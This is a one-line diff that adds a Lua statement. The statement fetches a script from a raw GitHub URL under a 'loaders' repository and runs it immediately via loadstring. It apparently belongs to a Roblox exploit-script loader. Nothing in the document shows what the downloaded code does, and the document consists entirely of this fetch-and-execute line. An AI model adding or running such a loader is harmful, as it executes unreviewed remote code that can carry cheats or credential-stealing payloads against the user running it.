@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/apple-ipad-original-spam1-28rk7ufaoa0zsp.lua"))()
